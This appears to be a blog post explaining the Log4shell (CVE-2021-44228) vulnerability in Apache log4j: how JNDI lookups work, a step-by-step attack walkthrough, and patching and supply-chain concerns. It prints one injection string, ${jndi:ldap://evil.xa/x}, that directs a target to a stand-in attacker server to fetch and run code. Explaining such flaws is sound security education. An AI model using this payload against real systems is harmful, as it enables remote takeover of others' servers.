WHEW, it certainly has been one hell of a year for cyber security, and it's only getting more intense. You may have heard of the recent vulnerability dubbed CVE-2021-44228, or better known as Log4shell. It has all cyber security professionals, hackers and businesses around the world very worried (or excited depending on where you stand on the issue). So what is Log4shell? Should you personally be worried about it? In this article I'll attempt to explain what it is and why this is such a big deal. Enjoy!
1. 
### What the hell is Log4shell?

Well first to understand what Log4shell is, we need to understand what underlying mechanism is being exploited. Let's start with **log4j**.

Log4j is a java library developed by Apache that is used to help log data. This logging mechanism allows for errors, authentication failures, user input, etc. to be logged into a format where they can be reviewed later for whatever reason. If you're a web application developer, this can be very useful. Log4j is also **open source**, which means that the code is available to be viewed, used and changed as needed by the requirements of the user. Java (code and framework) is one of the most commonly used technologies in the world. It runs on (but not limited to) webservers, mobile devices and even cars. There are hundreds of millions of devices that rely on Java, as well as log4j, so the number of potentially vulnerable devices are quite high. 

Log4shell is the vulnerability for log4j that takes advantage of its lookup functionality and improper input validation. You can think of lookups in this context for log4j as a way to interpolate input upon logging a message. The JNDI (Java Naming and Directory Interface) is the specific lookup available in log4j that has the capability to connect to resources remotely. An attacker can craft a special string that has the JNDI lookup make a request to a server that is under the attacker's control and then execute code remotely. Sound confusing? Well, it is. However, the practicality to exploit this vulnerability is very simple. Let's take a look at the attack in a bit more depth in the next section.

### Log4shell Example

The picture above shows a full example of how this vulnerability can be exploited by an attacker. Let's break this down:

1. The attacker crafts a malicious string that utilizes a JNDI lookup. The method for injecting this string can vary, but in this case, the attacker passed it the User Agent. The string ${jndi:ldap://evil.xa/x} tells the JNDI to connect to the attacker's evil LDAP server.

2. The string is passed to log4j for logging purposes.

3. Log4j takes the string, interpolates it and then queries the attacker's LDAP server. Remember, there is no input validation that is checking to see what is being passed. This means that log4j is happy to log any input it sees and query accordingly. 

4. The attacker's LDAP server responds to the query by giving the directory information that contains the malicious code.

5. The malicious code is then executed after being downloaded.

As we can see, this attack is quite simple yet very effective. There are many variations that an attacker can use to pass the string. The code executed could be setting up a reverse shell that allows the attacker to remotely control the target machine. The possibilities from there are endless.

### Conclusion 

This vulnerability is bad...

This is probably one of the biggest vulnerabilities that has been discovered in recent history. I liken this to the Heartbleed vulnerability that affected OpenSSL years ago. Although they are different vulnerabilities entirely, there were similar circumstances surrounding them both; Both technologies where the code lived in were open source, and both were exploited as a **zero day attack**. Zero days are exploits that have not been caught, detected or mitigated (via a patch for example). Attackers are able to utilize zero days as long as there is nothing stopping them from exploiting it. Usually once a zero day has been brought to the attention of the developers and the general public, patches will be made for it, so timing is a very important factor in using these exploits.

The challenge with log4j, which makes it different that other vulnerabilities, is that java runs on a myriad of devices, which means log4j ultimately does as well. This makes patch management for log4shell very difficult. Identifying which devices are A) critical systems and B) vulnerable can be a difficult process. Companies right now are scrambling to patch all systems that they know of that contain the vulnerability. Cyber security experts are predicting that the effects of this vulnerability have not fully been realized. It is quite possible that the really good hackers have been able to use this exploit to get into a network, establish persistence and then "go dark". They may be biding their time in order to figure out how to move laterally around the network and perform whatever malicious deed they want.

I think that what we're going to see in the future is an influx of supply chain attacks. Remember, while large companies like Apple or Google are actively patching and remediating devices, it doesn't mean their vendors are doing the same thing. As a matter of fact, larger companies can't force their vendors to patch devices or adhere to certain standards for cyber security. This creates a potential "in" for hackers as they can potentially compromise a vendor and then work to get into the main company's network.
